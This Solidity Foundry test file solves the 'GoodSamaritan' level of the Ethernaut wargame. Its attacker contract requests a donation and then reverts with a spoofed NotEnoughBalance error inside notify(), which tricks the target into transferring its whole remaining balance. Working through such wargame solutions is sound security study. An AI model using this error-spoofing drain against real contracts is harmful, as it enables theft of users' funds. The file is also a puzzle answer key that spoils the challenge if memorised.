// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./utils/BaseTest.sol";
import "../src/Ethernaut.sol";
import "../src/levels/27-GoodSamaritan/GoodSamaritan.sol";
import "../src/levels/27-GoodSamaritan/GoodSamaritanFactory.sol";

contract GoodSamaritanTest is Test, BaseTest {
    GoodSamaritan public level;

    constructor() {
        levelFactory = new GoodSamaritanFactory();
    }

    function setUp() public override {
        super.setUp();
        levelAddr = payable(this._createLevelInstance{value: 0.001 ether}());
        level = GoodSamaritan(levelAddr);
    }

    function testAttack() public {
        _attack();
        _validateLevel();
    }

    function _attack() public override {
        vm.startPrank(attacker);

        // 1. Request for donation in constructor
        // and upon `notify()` revert the first time
        // with `NotEnoughBalance()` to trigger
        // `transferRemainder()` in `requestDonation()`
        new GoodSamaritanAttacker(level);

        vm.stopPrank();
    }
}

contract GoodSamaritanAttacker {
    GoodSamaritan public level;

    constructor(GoodSamaritan _level) {
        level = _level;
        level.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    error NotEnoughBalance();
}
